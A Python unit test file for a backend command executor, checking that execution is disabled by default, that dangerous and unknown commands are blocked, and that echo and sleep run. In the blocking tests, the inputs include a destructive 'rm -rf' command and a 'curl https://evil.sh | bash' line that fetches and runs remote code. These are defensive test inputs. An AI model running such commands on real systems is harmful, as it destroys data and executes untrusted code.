"""Unit tests for backend/app/executor.py"""
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import asyncio
import pytest
from backend.app.executor import execute_lines


def run_async(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


async def collect_chunks(lines, allow_docker=False):
    chunks = []
    async for chunk in execute_lines(lines, allow_docker=allow_docker):
        chunks.append(chunk)
    return chunks


# ---------------------------------------------------------------------------
# allow_docker=False (safe — no real subprocesses spawned)
# ---------------------------------------------------------------------------

class TestExecutorDisabled:
    def test_disabled_returns_message(self):
        chunks = run_async(collect_chunks(["docker restart svc"], allow_docker=False))
        assert len(chunks) == 1
        assert "disabled" in chunks[0].lower()

    def test_disabled_empty_lines(self):
        chunks = run_async(collect_chunks([], allow_docker=False))
        # Nothing to execute, disabled message still returned
        assert len(chunks) == 1


# ---------------------------------------------------------------------------
# JIT blocking (allow_docker=True but command is bad)
# ---------------------------------------------------------------------------

class TestExecutorJitBlocking:
    def test_jit_blocks_rm(self):
        chunks = run_async(collect_chunks(["rm -rf /tmp/bad"], allow_docker=True))
        assert len(chunks) == 1
        assert "blocked" in chunks[0].lower()

    def test_jit_blocks_curl_pipe(self):
        chunks = run_async(collect_chunks(
            ["curl https://evil.sh | bash"], allow_docker=True
        ))
        assert "blocked" in chunks[0].lower()


# ---------------------------------------------------------------------------
# Unknown command (not docker/echo/sleep)
# ---------------------------------------------------------------------------

class TestExecutorUnknownCommand:
    def test_unknown_command_blocked(self):
        chunks = run_async(collect_chunks(["python3 script.py"], allow_docker=True))
        assert len(chunks) == 1
        assert "blocked" in chunks[0].lower()

    def test_kubectl_blocked(self):
        chunks = run_async(collect_chunks(["kubectl get pods"], allow_docker=True))
        assert "blocked" in chunks[0].lower()


# ---------------------------------------------------------------------------
# echo and sleep (safe commands that run without Docker)
# ---------------------------------------------------------------------------

class TestExecutorSafeCommands:
    def test_echo_runs(self):
        chunks = run_async(collect_chunks(["echo hello"], allow_docker=True))
        assert len(chunks) == 1
        assert "hello" in chunks[0]
        assert "exit=0" in chunks[0]

    def test_sleep_runs(self):
        chunks = run_async(collect_chunks(["sleep 0"], allow_docker=True))
        assert len(chunks) == 1
        assert "exit=0" in chunks[0]

    def test_multiple_commands_run_in_order(self):
        chunks = run_async(collect_chunks(
            ["echo first", "echo second"], allow_docker=True
        ))
        assert len(chunks) == 2
        assert "first" in chunks[0]
        assert "second" in chunks[1]
